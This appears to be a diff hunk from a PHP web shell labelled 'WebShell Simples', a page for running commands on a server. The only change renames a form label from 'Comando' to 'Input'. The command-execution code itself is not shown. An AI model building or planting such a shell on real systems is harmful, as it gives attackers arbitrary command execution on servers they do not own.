@@ -19,7 +19,7 @@ if (!empty($_POST['cmd'])) {
     <h1>+ WebShell Simples</h1>
     <h3>Utilize o campo para executar um comando:</h3><br>
     <form method="post">
-      <h2><strong>&gt; Comando:</strong></h2>
+      <h2><strong>&gt; Input:</strong></h2>
       <div class="form-group">
         <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
           onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
